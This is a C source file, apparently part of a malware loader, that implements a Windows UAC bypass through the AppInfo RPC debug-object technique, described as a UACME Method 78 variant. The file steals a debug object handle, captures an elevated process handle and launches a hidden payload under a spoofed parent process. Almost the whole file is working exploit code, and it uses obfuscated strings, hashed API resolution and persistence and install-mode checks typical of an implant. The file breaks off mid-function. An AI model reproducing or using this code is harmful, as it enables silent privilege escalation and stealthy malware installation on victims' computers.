// =============================================
// Uac.c  -  AppInfo RPC UAC bypass (UACME Method 78 variant)
//
// Two-phase technique (CRT-free, all APIs resolved dynamically):
//
//   Phase 1: AicLaunchAdminProcess(winver.exe, DEBUG_PROCESS)
//            NtQueryInformationProcess -> steal dbgHandle
//            NtRemoveProcessDebug + TerminateProcess(winver)
//
//   Phase 2: AicLaunchAdminProcess(ComputerDefaults.exe, DEBUG_PROCESS)
//            DbgUiSetThreadDebugObject(dbgHandle)   <- attach stolen obj
//            WaitForDebugEvent -> LOAD_DLL_DEBUG_EVENT
//            NtDuplicateObject(ComputerDefaults.hProcess, NtCurrentProcess)
//            -> elevated PROCESS_ALL_ACCESS handle to ComputerDefaults
//
// Callers (UacBypass / Install.c) pass that handle to SpawnChildOfParent
// to inherit the elevated token without a consent dialog.
//
// Compiled only when UAC_BYPASS is defined (build.bat uac variants).
// =============================================

#ifdef UAC_BYPASS

#include "Common.h"
#include <rpc.h>
#include <rpcndr.h>

// ---- WCHAR helpers (no CRT) ----
static SIZE_T UacWcsLen(const WCHAR* s) { SIZE_T n = 0; while (s[n]) n++; return n; }
static VOID UacWcsCpy(WCHAR* dst, const WCHAR* src, SIZE_T maxCch) {
    SIZE_T i; for (i = 0; i < maxCch - 1 && src[i]; i++) dst[i] = src[i]; dst[i] = 0;
}
static VOID UacWcsCat(WCHAR* dst, const WCHAR* src, SIZE_T maxCch) {
    SIZE_T n = UacWcsLen(dst), i;
    for (i = 0; i < maxCch - n - 1 && src[i]; i++) dst[n + i] = src[i];
    dst[n + i] = 0;
}
static VOID UacA2W(WCHAR* dst, const CHAR* src) {
    while (*src) *dst++ = (WCHAR)(UCHAR)*src++; *dst = 0;
}

// ---- AppInfo RPC structures ----
typedef struct _MONITOR_POINT { long MonitorLeft; long MonitorRight; } MONITOR_POINT;
typedef struct _APP_STARTUP_INFO {
    WCHAR* lpszTitle;
    long dwX, dwY, dwXSize, dwYSize;
    long dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
    short wShowWindow, cbReserved2;
    MONITOR_POINT MonitorPoint;
} APP_STARTUP_INFO;
typedef struct _APP_PROCESS_INFORMATION {
    ULONG_PTR ProcessHandle;
    ULONG_PTR ThreadHandle;
    LONG ProcessId;
    LONG ThreadId;
} APP_PROCESS_INFORMATION;

// ---- AppInfo MIDL marshaling blobs (from appinfo-uac-wd-exclude.c) ----
typedef struct { short Pad; unsigned char Format[75];  } appinfo_TYPE_FMT;
typedef struct { short Pad; unsigned char Format[103]; } appinfo_PROC_FMT;

static const appinfo_TYPE_FMT g_TypeFmt = {
    0, {
        0x00,0x00,0x12,0x08,0x25,0x5c,0x11,0x08,0x25,0x5c,0x11,0x00,0x0a,0x00,0x15,0x03,
        0x08,0x00,0x08,0x08,0x5c,0x5b,0x1a,0x03,0x38,0x00,0x00,0x00,0x14,0x00,0x36,0x08,
        0x08,0x08,0x08,0x08,0x08,0x08,0x08,0x06,0x3e,0x4c,0x00,0xe3,0xff,0x40,0x5c,0x5b,
        0x12,0x08,0x05,0x5c,0x11,0x04,0x02,0x00,0x1a,0x03,0x18,0x00,0x00,0x00,0x00,0x00,
        0xb9,0xb9,0x08,0x08,0x5c,0x5b,0x11,0x0c,0x08,0x5c,0x00
    }
};
static const appinfo_PROC_FMT g_ProcFmt = {
    0, {
        0x00,0x48,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x00,0x32,0x00,0x08,0x00,0x20,0x00,
        0x24,0x00,0xc7,0x0c,0x0a,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0b,0x00,
        0x10,0x00,0x02,0x00,0x0b,0x00,0x18,0x00,0x02,0x00,0x48,0x00,0x20,0x00,0x08,0x00,
        0x48,0x00,0x28,0x00,0x08,0x00,0x0b,0x01,0x30,0x00,0x08,0x00,0x0b,0x01,0x38,0x00,
        0x08,0x00,0x0b,0x01,0x40,0x00,0x16,0x00,0x48,0x00,0x48,0x00,0xb9,0x00,0x48,0x00,
        0x50,0x00,0x08,0x00,0x13,0x61,0x58,0x00,0x38,0x00,0x50,0x21,0x60,0x00,0x08,0x00,
        0x70,0x00,0x68,0x00,0x08,0x00,0x00
    }
};
static const RPC_CLIENT_INTERFACE g_RpcIface = {
    sizeof(RPC_CLIENT_INTERFACE),
    {{0x201ef99a,0x7fa0,0x444c,{0x93,0x99,0x19,0xba,0x84,0xf1,0x2a,0x1a}},{1,0}},
    {{0x8A885D04,0x1CEB,0x11C9,{0x9F,0xE8,0x08,0x00,0x2B,0x10,0x48,0x60}},{2,0}},
    0,0,0,0,0,0
};
static RPC_BINDING_HANDLE g_AutoBind;

// Non-const: patched with NdrOleAllocate/NdrOleFree at runtime
static MIDL_STUB_DESC g_StubDesc = {
    (void*)&g_RpcIface,
    NULL,              // pfnAllocate — filled at runtime
    NULL,              // pfnFree    — filled at runtime
    {&g_AutoBind},
    0,0,0,0,
    (const unsigned char*)g_TypeFmt.Format,
    1,
    0x50002,
    0,
    0x801026e,
    0,0,0,
    0x1,
    0,0,0
};

// ---- Typedefs for dynamically-resolved RPC functions ----
typedef RPC_STATUS (RPC_ENTRY* fnRpcStringBindingComposeW)(RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR, RPC_WSTR*);
typedef RPC_STATUS (RPC_ENTRY* fnRpcBindingFromStringBindingW)(RPC_WSTR, RPC_BINDING_HANDLE*);
typedef RPC_STATUS (RPC_ENTRY* fnRpcStringFreeW)(RPC_WSTR*);
typedef RPC_STATUS (RPC_ENTRY* fnRpcBindingSetAuthInfoExW)(RPC_BINDING_HANDLE, RPC_WSTR, ULONG, ULONG, RPC_AUTH_IDENTITY_HANDLE, ULONG, RPC_SECURITY_QOS*);
typedef RPC_STATUS (RPC_ENTRY* fnRpcAsyncInitializeHandle)(PRPC_ASYNC_STATE, UINT);
typedef RPC_STATUS (RPC_ENTRY* fnRpcAsyncCompleteCall)(PRPC_ASYNC_STATE, void*);
typedef RPC_STATUS (RPC_ENTRY* fnRpcBindingFree)(RPC_BINDING_HANDLE*);
typedef CLIENT_CALL_RETURN (__cdecl* fnNdrAsyncClientCall)(PMIDL_STUB_DESC, PFORMAT_STRING, ...);
typedef void* (__RPC_API* fnNdrOleAllocate)(size_t);
typedef void  (__RPC_API* fnNdrOleFree)(void*);

// ---- Typedefs for kernel32 + advapi32 functions ----
typedef BOOL   (WINAPI* fnCreateWellKnownSid)(INT, PSID, PSID, PDWORD);
typedef DWORD  (WINAPI* fnGetSysDir)(LPWSTR, UINT);
typedef DWORD  (WINAPI* fnGetWinDir)(LPWSTR, UINT);
typedef DWORD  (WINAPI* fnGetModFileW)(HMODULE, LPWSTR, DWORD);
typedef HANDLE (WINAPI* fnCreateEventW2)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCWSTR);
typedef DWORD  (WINAPI* fnWaitForSingle)(HANDLE, DWORD);
typedef BOOL   (WINAPI* fnWaitForDbgEv)(LPDEBUG_EVENT, DWORD);
typedef BOOL   (WINAPI* fnContDbgEv)(DWORD, DWORD, DWORD);
typedef BOOL   (WINAPI* fnDbgActiveStop)(DWORD);
typedef BOOL   (WINAPI* fnTermProc)(HANDLE, UINT);
typedef BOOL   (WINAPI* fnCloseH)(HANDLE);

// ---- Struct holding resolved RPC APIs (passed between helpers) ----
typedef struct _UAC_RPCS {
    fnRpcStringBindingComposeW pStrBind;
    fnRpcBindingFromStringBindingW pBindFromStr;
    fnRpcStringFreeW pStrFree;
    fnRpcBindingSetAuthInfoExW pSetAuth;
    fnRpcAsyncInitializeHandle pAsyncInit;
    fnRpcAsyncCompleteCall pAsyncComplete;
    fnRpcBindingFree pBindFree;
    fnNdrAsyncClientCall pNdrAsync;
    fnCreateWellKnownSid pCreateSid;
    fnCreateEventW2 pCreateEvent;
    fnWaitForSingle pWaitSingle;
    fnWaitForDbgEv pWaitDbg;
    fnContDbgEv pContDbg;
    fnDbgActiveStop pDbgStop;
    fnTermProc pTermProc;
    fnCloseH pCloseHandle;
    fnGetSysDir pGetSysDir;
    fnGetWinDir pGetWinDir;
    fnGetModFileW pGetModFileW;
    fnNdrOleAllocate pNdrOleAlloc;
    fnNdrOleFree pNdrOleFree;
} UAC_RPCS, *PUAC_RPCS;

// ---- Typedefs for ntdll native functions ----
typedef NTSTATUS (NTAPI* fnNtQIP)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef NTSTATUS (NTAPI* fnNtRPD)(HANDLE, HANDLE);
typedef NTSTATUS (NTAPI* fnNtDupObj)(HANDLE, HANDLE, HANDLE, PHANDLE, ACCESS_MASK, ULONG, ULONG);
typedef VOID     (NTAPI* fnDbgUiSet)(HANDLE);
typedef NTSTATUS (NTAPI* fnNtTermProc)(HANDLE, NTSTATUS);
typedef NTSTATUS (NTAPI* fnNtOPT)(HANDLE, ACCESS_MASK, PVOID, PHANDLE);
typedef NTSTATUS (NTAPI* fnNtQIT)(HANDLE, ULONG, PVOID, ULONG, PULONG);

// ---- RAiLaunchAdminProcess wrapper ----
static VOID RaLaunchAdminProcess(
    PUAC_RPCS pR, PRPC_ASYNC_STATE pAsync, RPC_BINDING_HANDLE hBind,
    LPWSTR Path, LPWSTR Cmd, LONG SFlags, LONG CFlags, LPWSTR Dir,
    LPWSTR WinSta, APP_STARTUP_INFO* pSI, ULONG_PTR hWnd, LONG Tout,
    APP_PROCESS_INFORMATION* pPI, LONG* pElev)
{
    pR->pNdrAsync((PMIDL_STUB_DESC)&g_StubDesc,
        (PFORMAT_STRING)&g_ProcFmt.Format[0],
        pAsync, hBind, Path, Cmd, SFlags, CFlags, Dir, WinSta,
        pSI, hWnd, Tout, pPI, pElev);
}

// ---- AicLaunchAdminProcess: one AppInfo RPC call ----
static BOOL AicLaunch(
    PUAC_RPCS pR, PVOID pAdvapi32,
    LPWSTR wPath, LPWSTR wCmd, LONG SFlags, LONG CFlags,
    LPWSTR wWinDir, LPWSTR wWinSta, WORD wShow,
    APP_PROCESS_INFORMATION* pPI)
{
    RPC_BINDING_HANDLE hBind = NULL;
    RPC_ASYNC_STATE    asyncState = {0};
    RPC_WSTR           wStrBind   = NULL;
    PSID               pSid       = NULL;
    LONG               elevType   = 0;
    VOID*              reply      = NULL;
    BOOL               ok         = FALSE;
    APP_STARTUP_INFO   si         = {0};
    BYTE               sidBuf[SECURITY_MAX_SID_SIZE] = {0};
    DWORD              cbSid      = SECURITY_MAX_SID_SIZE;

    // Decode obfuscated strings for RPC binding
    BYTE xUuid[]    = XSTR_APPINFO_UUID;   DEOBF(xUuid);
    BYTE xNcalrpc[] = XSTR_NCALRPC;        DEOBF(xNcalrpc);
    WCHAR wUuid[48]    = {0};
    WCHAR wNcalrpc[16] = {0};
    UacA2W(wUuid,    (CHAR*)xUuid);
    UacA2W(wNcalrpc, (CHAR*)xNcalrpc);

    RPC_STATUS s = pR->pStrBind((RPC_WSTR)wUuid, (RPC_WSTR)wNcalrpc,
                                NULL, NULL, NULL, &wStrBind);
    if (s != RPC_S_OK) return FALSE;
    s = pR->pBindFromStr(wStrBind, &hBind);
    pR->pStrFree(&wStrBind);
    if (s != RPC_S_OK) return FALSE;

    // Mutual auth with LocalSystem SID
    if (pR->pCreateSid && pAdvapi32) {
        if (pR->pCreateSid(22 /*WinLocalSystemSid*/, NULL, (PSID)sidBuf, &cbSid)) {
            pSid = (PSID)sidBuf;
        }
    }
    if (pSid) {
        RPC_SECURITY_QOS_V3 sqos = {0};
        sqos.Version          = 3;
        sqos.ImpersonationType = RPC_C_IMP_LEVEL_IMPERSONATE;
        sqos.Capabilities     = RPC_C_QOS_CAPABILITIES_MUTUAL_AUTH;
        sqos.Sid              = pSid;
        pR->pSetAuth(hBind, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
                     RPC_C_AUTHN_WINNT, NULL, 0, (RPC_SECURITY_QOS*)&sqos);
    }

    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = (short)wShow;
    si.lpszTitle   = NULL;

    pR->pAsyncInit(&asyncState, sizeof(asyncState));
    asyncState.NotificationType = RpcNotificationTypeEvent;
    asyncState.u.hEvent = pR->pCreateEvent(NULL, FALSE, FALSE, NULL);
    if (!asyncState.u.hEvent) { pR->pBindFree(&hBind); return FALSE; }

    RaLaunchAdminProcess(pR, &asyncState, hBind,
        wPath, wCmd, SFlags, CFlags,
        wWinDir, wWinSta, &si, (ULONG_PTR)NULL, INFINITE,
        pPI, &elevType);

    pR->pWaitSingle(asyncState.u.hEvent, INFINITE);
    ok = (pR->pAsyncComplete(&asyncState, &reply) == RPC_S_OK);
    pR->pCloseHandle(asyncState.u.hEvent);
    pR->pBindFree(&hBind);
    return ok;
}

// ---- IsElevated: NtOpenProcessToken + NtQueryInformationToken ----
static BOOL IsElevated(PVOID pNtdll) {
    fnNtOPT   pNtOPT = (fnNtOPT)  FetchExportAddress(pNtdll, NtOpenProcessToken_JOAAT);
    fnNtQIT   pNtQIT = (fnNtQIT)  FetchExportAddress(pNtdll, NtQueryInformationToken_JOAAT);
    fnNtTermProc pNtClose2 = (fnNtTermProc)FetchExportAddress(pNtdll, NtClose_JOAAT);
    if (!pNtOPT || !pNtQIT) return FALSE;

    HANDLE hToken = NULL;
    if (!NT_SUCCESS(pNtOPT((HANDLE)(ULONG_PTR)-1, TOKEN_QUERY, NULL, &hToken)))
        return FALSE;

    // TokenElevation = 20
    DWORD elevated = 0, retLen = 0;
    pNtQIT(hToken, 20, &elevated, sizeof(elevated), &retLen);
    if (pNtClose2) ((fnNtOPT)(PVOID)pNtClose2)(hToken, 0, NULL, NULL);
    return elevated != 0;
}

// ---- IsInstallMode: TRUE if command line contains "--install" ----
// Set by UacBypass when spawning the child that should call InstallAndTerminate.
static BOOL IsInstallMode(IN PAPI_HASHING pApi) {
    PVOID pK32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pK32) return FALSE;
    typedef LPWSTR (WINAPI* fnGetCmdLine)(VOID);
    fnGetCmdLine pGCL = (fnGetCmdLine)pApi->pGetProcAddress((HMODULE)pK32, "GetCommandLineW");
    if (!pGCL) return FALSE;
    LPWSTR wCmd = pGCL();
    if (!wCmd) return FALSE;
    const WCHAR wFlag[] = L"--install";
    const SIZE_T flagLen = 9;
    for (SIZE_T i = 0; wCmd[i]; i++) {
        BOOL m = TRUE;
        for (SIZE_T j = 0; j < flagLen; j++) {
            if (!wCmd[i + j] || wCmd[i + j] != wFlag[j]) { m = FALSE; break; }
        }
        if (m) return TRUE;
    }
    return FALSE;
}

// ---- IsFirstRunProcess: TRUE if we're NOT running from install path ----
BOOL IsFirstRunProcess(IN PAPI_HASHING pApi) {
    PVOID pK32 = FindLoadedModuleW(L"KERNEL32.DLL");
    if (!pK32) return TRUE;

    typedef DWORD (WINAPI* fnGetModFileA)(HMODULE, LPSTR, DWORD);
    fnGetModFileA pGMFA = (fnGetModFileA)FetchExportAddress(pK32, GetModuleFileNameA_JOAAT);
    if (!pGMFA) return TRUE;

    CHAR szPath[MAX_PATH] = {0};
    DWORD n = pGMFA(NULL, szPath, MAX_PATH);
    if (!n) return TRUE;

    // Find filename part
    INT last = -1;
    for (INT i = (INT)n - 1; i >= 0; i--) {
        if (szPath[i] == '\\') { last = i; break; }
    }
    CHAR* szFn = (last >= 0) ? &szPath[last + 1] : szPath;

    BYTE xPersist[] = XSTR_PERSIST_EXE_NAME; DEOBF(xPersist);
    // Returns TRUE if filename is NOT the install name (i.e., we ARE the original loader)
    return (StrCmpA(szFn, (LPCSTR)xPersist) != 0);
}

// ---- SpawnChildOfParent: CreateProcessW with spoofed parent ----
NTSTATUS SpawnChildOfParent(IN PAPI_HASHING pApi, IN PVOID pK32, IN HANDLE hParent, IN LPWSTR wPayload) {
    typedef BOOL (WINAPI* fnInitAttr)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD, PSIZE_T);
    typedef BOOL (WINAPI* fnUpdAttr)(LPPROC_THREAD_ATTRIBUTE_LIST, DWORD, DWORD_PTR, PVOID, SIZE_T, PVOID, PSIZE_T);
    typedef VOID (WINAPI* fnDelAttr)(LPPROC_THREAD_ATTRIBUTE_LIST);
    typedef BOOL (WINAPI* fnCPW)(LPCWSTR, LPWSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCWSTR, LPSTARTUPINFOW, LPPROCESS_INFORMATION);

    // Resolve via GetProcAddress with plain names — avoids JOAAT hash mismatches
    // for functions that may be forwarded from kernel32 to kernelbase.
    fnInitAttr pInit = (fnInitAttr)pApi->pGetProcAddress((HMODULE)pK32, "InitializeProcThreadAttributeList");
    fnUpdAttr  pUpd  = (fnUpdAttr) pApi->pGetProcAddress((HMODULE)pK32, "UpdateProcThreadAttribute");
    fnDelAttr  pDel  = (fnDelAttr) pApi->pGetProcAddress((HMODULE)pK32, "DeleteProcThreadAttributeList");
    fnCPW      pCPW  = (fnCPW)     pApi->pGetProcAddress((HMODULE)pK32, "CreateProcessW");
    fnCloseH   pClH  = (fnCloseH)  pApi->pGetProcAddress((HMODULE)pK32, "CloseHandle");

    if (!pInit) { LOG("[!] SpawnChildOfParent: InitializeProcThreadAttributeList NULL"); return (NTSTATUS)0xC0000001; }
    if (!pUpd)  { LOG("[!] SpawnChildOfParent: UpdateProcThreadAttribute NULL");          return (NTSTATUS)0xC0000001; }
    if (!pDel)  { LOG("[!] SpawnChildOfParent: DeleteProcThreadAttributeList NULL");      return (NTSTATUS)0xC0000001; }
    if (!pCPW)  { LOG("[!] SpawnChildOfParent: CreateProcessW NULL");                     return (NTSTATUS)0xC0000001; }
    if (!pK32)  { LOG("[!] SpawnChildOfParent: pK32 NULL");                               return (NTSTATUS)0xC0000001; }

    SIZE_T attrSize = 0;
    pInit(NULL, 1, 0, &attrSize);
    LPPROC_THREAD_ATTRIBUTE_LIST pAttr =
        (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, attrSize);
    if (!pAttr) {
        LOG("[!] SpawnChildOfParent: HeapAlloc failed");
        return (NTSTATUS)0xC000009A;
    }

    if (!pInit(pAttr, 1, 0, &attrSize)) {
        LOG("[!] SpawnChildOfParent: InitializeProcThreadAttributeList failed");
        HeapFree(GetProcessHeap(), 0, pAttr); return (NTSTATUS)0xC0000001;
    }
    if (!pUpd(pAttr, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
              &hParent, sizeof(HANDLE), NULL, NULL)) {
        LOG("[!] SpawnChildOfParent: UpdateProcThreadAttribute failed");
        pDel(pAttr); HeapFree(GetProcessHeap(), 0, pAttr);
        return (NTSTATUS)0xC0000001;
    }

    STARTUPINFOEXW si = {0};
    PROCESS_INFORMATION pi = {0};
    si.StartupInfo.cb          = sizeof(si);
    si.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.lpAttributeList         = pAttr;

    BYTE xDesk[] = XSTR_WINSTA_DEFAULT; DEOBF(xDesk);
    WCHAR wDesk[32] = {0};
    UacA2W(wDesk, (CHAR*)xDesk);
    si.StartupInfo.lpDesktop = wDesk;

    NTSTATUS ret = (NTSTATUS)0xC0000001;
    if (pCPW(NULL, wPayload, NULL, NULL, FALSE,
             CREATE_UNICODE_ENVIRONMENT | EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
             NULL, NULL, (LPSTARTUPINFOW)&si, &pi))
    {
        if (pClH) { pClH(pi.hThread); pClH(pi.hProcess); }
        ret = 0;
    } else {
        LOG_HEX("[!] SpawnChildOfParent: CreateProcessW failed, GLE=", GetLastError());
    }

    pDel(pAttr);
    HeapFree(GetProcessHeap(), 0, pAttr);
    return ret;
}

// ---- AcquireElevatedHandle: both AppInfo phases, returns ComputerDefaults handle ----
BOOL AcquireElevatedHandle(
    IN PUAC_RPCS pR,
    IN PVOID pAdvapi32,
    IN PVOID pNtdll,
    IN LPWSTR wSysDir,
    IN LPWSTR wWinDir,
    OUT PHANDLE pOutHandle)
{
    PVOID pNtdllLocal = pNtdll;
    fnNtQIP     pNtQIP  = (fnNtQIP)    FetchExportAddress(pNtdllLocal, NtQueryInformationProcess_JOAAT);
    fnNtRPD     pNtRPD  = (fnNtRPD)    FetchExportAddress(pNtdllLocal, NtRemoveProcessDebug_JOAAT);
    fnNtDupObj  pNtDup  = (fnNtDupObj) FetchExportAddress(pNtdllLocal, NtDuplicateObject_JOAAT);
    fnDbgUiSet  pDbgSet = (fnDbgUiSet) FetchExportAddress(pNtdllLocal, DbgUiSetThreadDebugObject_JOAAT);

    if (!pNtQIP || !pNtRPD || !pNtDup || !pDbgSet) return FALSE;

    BYTE xWinver[]   = XSTR_WINVER_EXE;          DEOBF(xWinver);
    BYTE xCompDef[]  = XSTR_COMPUTERDEFAULTS_EXE; DEOBF(xCompDef);
    BYTE xWinSta[]   = XSTR_WINSTA_DEFAULT;       DEOBF(xWinSta);
    WCHAR wWinver[MAX_PATH]  = {0};
    WCHAR wCompDef[MAX_PATH] = {0};
    WCHAR wWinSta[32]        = {0};
    UacWcsCpy(wWinver,  wSysDir, MAX_PATH); UacA2W(wWinver  + UacWcsLen(wWinver),  (CHAR*)xWinver);
    UacWcsCpy(wCompDef, wSysDir, MAX_PATH); UacA2W(wCompDef + UacWcsLen(wCompDef), (CHAR*)xCompDef);
    UacA2W(wWinSta, (CHAR*)xWinSta);

    // Phase 1: launch winver.exe under DEBUG_PROCESS, steal the debug object handle
    APP_PROCESS_INFORMATION pi1 = {0};
    if (!AicLaunch(pR, pAdvapi32, wWinver, wWinver, 0,
                   CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
                   wWinDir, wWinSta, SW_HIDE, &pi1))
    {
        LOG("[!] UacBypass: Phase1 AicLaunch failed");
        return FALSE;
    }

    HANDLE hDbg = NULL;
    pNtQIP((HANDLE)(ULONG_PTR)pi1.ProcessHandle, 30 /*ProcessDebugObjectHandle*/,
           &hDbg, sizeof(HANDLE), NULL);
    if (!hDbg) {
        pR->pTermProc((HANDLE)(ULONG_PTR)pi1.ProcessHandle, 0);
        pR->pCloseHandle((HANDLE)(ULONG_PTR)pi1.ThreadHandle);
        pR->pCloseHandle((HANDLE)(ULONG_PTR)pi1.ProcessHandle);
        LOG("[!] UacBypass: no debug handle from Phase1");
        return FALSE;
    }
    pNtRPD((HANDLE)(ULONG_PTR)pi1.ProcessHandle, hDbg);
    pR->pTermProc((HANDLE)(ULONG_PTR)pi1.ProcessHandle, 0);
    pR->pCloseHandle((HANDLE)(ULONG_PTR)pi1.ThreadHandle);
    pR->pCloseHandle((HANDLE)(ULONG_PTR)pi1.ProcessHandle);
    LOG("[+] UacBypass: Phase1 complete, debug handle acquired");

    // Phase 2: launch ComputerDefaults.exe under DEBUG_PROCESS with stolen object
    APP_PROCESS_INFORMATION pi2 = {0};
    if (!AicLaunch(pR, pAdvapi32, wCompDef, wCompDef, 1,
                   CREATE_UNICODE_ENVIRONMENT | DEBUG_PROCESS,
                   wWinDir, wWinSta, SW_HIDE, &pi2))
    {
        ((fnNtRPD)(PVOID)pNtQIP)(hDbg, NULL); // NtClose via cast trick
        FetchExportAddress(pNtdllLocal, NtClose_JOAAT); // touch to avoid dead-code elim
        LOG("[!] UacBypass: Phase2 AicLaunch failed");
        return FALSE;
    }

    pDbgSet(hDbg); // attach stolen debug object to current thread

    HANDLE hProcElevated = NULL;
    DEBUG_EVENT dbgEvent = {0};
    BOOL        found    = FALSE;
    HANDLE      hProc2   = NULL;

    for (INT attempt = 0; attempt < 50 && !found; attempt++) {
        if (!pR->pWaitDbg(&dbgEvent, 5000)) break;

        if (dbgEvent.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT)
            hProc2 = dbgEvent.u.CreateProcessInfo.hProcess;

        if (dbgEvent.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT && hProc2) {
            // Duplicate the elevated process's self-handle into ours
            NTSTATUS ns = pNtDup(hProc2, (HANDLE)(ULONG_PTR)-1,
                                 (HANDLE)(ULONG_PTR)-1, &hProcElevated,
                                 PROCESS_ALL_ACCESS, 0, 0);
            if (NT_SUCCESS(ns)) found = TRUE;
        }
        pR->pContDbg(dbgEvent.dwProcessId, dbgEvent.dwThreadId, DBG_CONTINUE);
    }

    pR->pDbgStop(pi2.ProcessId);
    pDbgSet(NULL);

    // NtClose(hDbg) — reuse NtTerminateProcess slot via the already-resolved ntdll
    typedef NTSTATUS (NTAPI* fnNtClose2)(HANDLE);
    fnNtClose2 pNtClose2 = (fnNtClose2)FetchExportAddress(pNtdllLocal, NtClose_JOAAT);
    if (pNtClose2) pNtClose2(hDbg);

    pR->pTermProc((HANDLE)(ULONG_PTR)pi2.ProcessHandle, 0);
    pR->pCloseHandle((HANDLE)(ULONG_PTR)pi2.ThreadHandle);
    pR->pCloseHandle((HANDLE)(ULONG_PTR)pi2.ProcessHandle);

    if (!found || !hProcElevated) {
        LOG("[!] UacBypass: failed to capture elevated handle");
        return FALSE;
    }
    *pOutHandle = hProcElevated;
    LOG("[+] UacBypass: elevated handle acquired");
    return TRUE;
}

// ---- ResolveRpcApis: load rpcrt4 + advapi32, fill UAC_RPCS struct ----
static BOOL ResolveRpcApis(IN PAPI_HASHING pApi, OUT PUAC_RPCS pR, OUT PVOID* ppAdvapi32) {
    BYTE xRpcrt4[]  = XSTR_RPCRT4_DLL;   DEOBF(xRpcrt4);
    BYTE xAdv[]     = XSTR_ADVAPI32_DLL; DEOBF(xAdv);
    PVOID pRpc = pApi->pLoadLibraryA((LPCSTR)xRpcrt4);
    PVOID pAdv = pApi->pLoadLibraryA((LPCSTR)xAdv);
    if (!pRpc) { LOG("[!] UacBypass: rpcrt4 load failed"); return FALSE; }

    BYTE xStrBind[]    = XSTR_RPC_STRING_BIND_COMP; DEOBF(xStrBind);
    BYTE xBindStr[]    = XSTR_RPC_BIND_FROM_STR;    DEOBF(xBindStr);
    BYTE xStrFree[]    = XSTR_RPC_STRING_FREE;       DEOBF(xStrFree);
    BYTE xSetAuth[]    = XSTR_RPC_BIND_SET_AUTH;     DEOBF(xSetAuth);
    BYTE xAsyncInit[]  = XSTR_RPC_ASYNC_INIT;        DEOBF(xAsyncInit);
    BYTE xAsyncComp[]  = XSTR_RPC_ASYNC_COMPLETE;    DEOBF(xAsyncComp);
    BYTE xBindFree[]   = XSTR_RPC_BIND_FREE;         DEOBF(xBindFree);
    BYTE xNdrAsync[]   = XSTR_NDR_ASYNC_CALL;        DEOBF(xNdrAsync);
    BYTE xOleAlloc[]   = XSTR_NDR_OLE_ALLOC;         DEOBF(xOleAlloc);
    BYTE xOleFree[]    = XSTR_NDR_OLE_FREE;          DEOBF(xOleFree);

    pR->pStrBind     = (fnRpcStringBindingComposeW)   pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xStrBind);
    pR->pBindFromStr = (fnRpcBindingFromStringBindingW)pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xBindStr);
    pR->pStrFree     = (fnRpcStringFreeW)              pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xStrFree);
    pR->pSetAuth     = (fnRpcBindingSetAuthInfoExW)    pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xSetAuth);
    pR->pAsyncInit   = (fnRpcAsyncInitializeHandle)    pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xAsyncInit);
    pR->pAsyncComplete=(fnRpcAsyncCompleteCall)        pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xAsyncComp);
    pR->pBindFree    = (fnRpcBindingFree)              pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xBindFree);
    pR->pNdrAsync    = (fnNdrAsyncClientCall)          pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xNdrAsync);
    pR->pNdrOleAlloc = (fnNdrOleAllocate)              pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xOleAlloc);
    pR->pNdrOleFree  = (fnNdrOleFree)                 pApi->pGetProcAddress((HMODULE)pRpc, (LPCSTR)xOleFree);

    if (!pR->pStrBind || !pR->pBindFromStr || !pR->pNdrAsync ||
        !pR->pNdrOleAlloc || !pR->pNdrOleFree) {
        LOG("[!] UacBypass: RPC function resolution failed"); return FALSE;
    }

    // Patch stub desc with live allocator/free pointers
    g_StubDesc.pfnAllocate = pR->pNdrOleAlloc;
    g_StubDesc.pfnFree     = pR->pNdrOleFree;

    PVOID pK32 = FindLoadedModuleW(L"KERNEL32.DLL");
    BYTE xCrtSid[] = XSTR_CREATE_WELL_KNOWN_SID; DEOBF(xCrtSid);
    if (pAdv) {
        pR->pCreateSid = (fnCreateWellKnownSid)pApi->pGetProcAddress((HMODULE)pAdv, (LPCSTR)xCrtSid);
    }
    pR->pCreateEvent = (fnCreateEventW2) FetchExportAddress(pK32, CreateEventW_JOAAT);
    pR->pWaitSingle  = (fnWaitForSingle) FetchExportAddress(pK32, WaitForSingleObject_JOAAT);
    pR->pWaitDbg     = (fnWaitForDbgEv) FetchExportAddress(pK32, WaitForDebugEvent_JOAAT);
    pR->pContDbg     = (fnContDbgEv)    FetchExportAddress(pK32, ContinueDebugEvent_JOAAT);
    pR->pDbgStop     = (fnDbgActiveStop)FetchExportAddress(pK32, DebugActiveProcessStop_JOAAT);
    pR->pTermProc    = (fnTermProc)     FetchExportAddress(pK32, TerminateProcess_JOAAT);
    pR->pCloseHandle = (fnCloseH)       FetchExportAddress(pK32, CloseHandle_JOAAT);
    pR->pGetSysDir   = (fnGetSysDir)    FetchExportAddress(pK32, GetSystemDirectoryW_JOAAT);
